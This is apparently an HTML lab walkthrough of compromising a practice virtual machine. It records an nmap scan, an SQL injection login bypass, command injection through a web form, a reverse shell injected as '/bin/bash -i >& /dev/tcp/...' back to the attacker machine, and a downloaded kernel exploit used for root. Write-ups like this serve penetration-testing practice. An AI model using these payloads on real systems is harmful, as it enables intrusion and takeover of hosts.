@@ -1,0 +1,44 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Procedimentos</title>
+</head><body>Kali machine: 172.16.93.155<br/>
+Target machine: 172.16.93.164<br/>
+==========================================================<br/>
+<br/>
+nmap -sV -p- 172.16.93.164<br/>
+<br/>
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-05-27 14:45 BRT<br/>
+Nmap scan report for 172.16.93.164<br/>
+Host is up (0.00028s latency).<br/>
+Not shown: 65528 closed ports<br/>
+PORT &nbsp; &nbsp; STATE SERVICE &nbsp;VERSION<br/>
+22/tcp &nbsp; open &nbsp;ssh &nbsp; &nbsp; &nbsp;OpenSSH 3.9p1 (protocol 1.99)<br/>
+80/tcp &nbsp; open &nbsp;http &nbsp; &nbsp; Apache httpd 2.0.52 ((CentOS))<br/>
+111/tcp &nbsp;open &nbsp;rpcbind &nbsp;2 (RPC #100000)<br/>
+443/tcp &nbsp;open &nbsp;ssl/http Apache httpd 2.0.52 ((CentOS))<br/>
+631/tcp &nbsp;open &nbsp;ipp &nbsp; &nbsp; &nbsp;CUPS 1.1<br/>
+840/tcp &nbsp;open &nbsp;status &nbsp; 1 (RPC #100024)<br/>
+3306/tcp open &nbsp;mysql &nbsp; &nbsp;MySQL (unauthorized)<br/>
+MAC Address: 00:0C:29:09:CF:BC (VMware)<span style="font-size: 12pt"><br/>
+</span><span style="font-size: 12pt"><br/>
+</span>After looking at port 80 and 443 open, I accessed the page on port 80.<br/>
+<img src="screenshot.png" /><br/>
+<br/>
+I tried to apply sqli and got success (<i>1' OR 1=1#</i>), and I accessed the admin area<span style="font-size: 13pt">.<br/>
+</span><span style="font-size: 13pt"><img src="screenshot 2.png" /><br/>
+<br/>
+I tested the localhost address to see if the link was working. It was all right! <br/>
+Then I tested the following argument: <i>localhost; ls<br/>
+</i><img src="screenshot 3.png" />&nbsp;<br/>
+Returned two &nbsp;.php files ! :)<br/>
+<br/>
+On the kali machine, I opened a connection on port 444 and passed the following parameter on machine target:<br/>
+<i>localhost; /bin/bash -i &gt;&amp; /dev/tcp/172.16.93.155/444 0&gt;&amp;1</i><br/>
+<br/>
+Getting the kernel version of linux (2.6.9) I found the following exploit <i>https://www.exploit-db.com/exploits/9545/.<br/>
+</i><i><br/>
+I started apache on my machine and put file 9545.c in / var / www / html / and then downloaded it to target machine with wget. I compiled it as described in the file and got root access.<br/>
+<img src="screenshot 4.png" /><br/>
+</i></span></body></html>
